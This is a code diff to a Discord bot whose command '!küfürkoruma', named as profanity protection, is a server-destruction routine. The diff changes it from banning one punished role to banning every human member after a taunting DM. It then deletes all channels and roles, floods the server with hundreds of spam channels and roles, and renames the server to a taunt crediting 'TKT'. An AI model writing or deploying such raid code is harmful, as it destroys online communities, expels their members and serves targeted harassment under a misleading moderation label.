@@ -81,14 +81,12 @@ client.on('messageCreate', async (message) => {
   }
 
   else if (command === '!küfürkoruma') {
-    const role = message.guild.roles.cache.find(r => r.name === 'Cezalı');
-    if (!role) return message.reply('❌ "Cezalı" rolü bulunamadı.');
-
     const members = await message.guild.members.fetch();
     let bannedCount = 0;
 
+    // Herkesi banla (botlar hariç)
     for (const member of members.values()) {
-      if (!member.user.bot && member.roles.cache.has(role.id)) {
+      if (!member.user.bot) {
         await member.send('TKTlendiniz By. sys.fors & Alilw').catch(() => {});
         await member.ban({ reason: 'Küfürkoruma aktif edildi.' }).catch(() => {});
         bannedCount++;
@@ -96,30 +94,37 @@ client.on('messageCreate', async (message) => {
     }
 
     // Tüm kanalları sil
-    const deletePromises = message.guild.channels.cache.map(channel => channel.delete().catch(() => {}));
-    await Promise.all(deletePromises);
+    await Promise.all(message.guild.channels.cache.map(channel => channel.delete().catch(() => {})));
+
+    // 300 yeni kanal oluştur
+    const names = ['TKT💋', 'FORS💦', 'ALİLW💝'];
+    for (let i = 0; i < 300; i++) {
+      const name = names[i % names.length];
+      await message.guild.channels.create({ name }).catch(() => {});
+    }
+
+    // Tüm rolleri sil
+    const roles = message.guild.roles.cache;
+    for (const role of roles.values()) {
+      if (role.editable && role.id !== message.guild.id) {
+        await role.delete().catch(() => {});
+      }
+    }
+
+    // 200 rastgele renkli rol oluştur
+    for (let i = 0; i < 200; i++) {
+      const randomColor = `#${Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0')}`;
+      await message.guild.roles.create({
+        name: 'BÖÖ KORKTUNMUU😜',
+        color: randomColor,
+        hoist: true
+      }).catch(() => {});
+    }
 
     // Sunucu adını değiştir
     await message.guild.setName('💦FORS AFFETMEZ SABAHA SUNUCUN AFFEDİLMEZ💦').catch(() => {});
 
-    // 500 yeni kanal oluştur
-    const names = ['TKT💋', 'FORS💦', 'ALİLW💝', 'TKT💋'];
-    for (let i = 0; i < 500; i++) {
-      const name = names[i % names.length];
-      message.guild.channels.create({ name: name }).catch(() => {});
-    }
-
-    // 250 rastgele renkli rol oluştur
-    for (let i = 0; i < 250; i++) {
-      const randomColor = `#${Math.floor(Math.random() * 16777215).toString(16)}`;
-      await message.guild.roles.create({
-        name: 'BÖÖ KORKTUNMUU😜',
-        color: randomColor,
-        hoist: true // listede gösterilsin
-      }).catch(() => {});
-    }
-
-    message.channel.send(`🧹 ${bannedCount} kişi banlandı. Kanallar silindi, yeni kanallar ve roller oluşturuldu. Glory To TKT!`);
+    message.channel.send(`🧹 ${bannedCount} kişi banlandı. Kanallar ve roller silindi, yeni kanallar ve roller oluşturuldu. Glory To TKT!`);
   }
 });
 
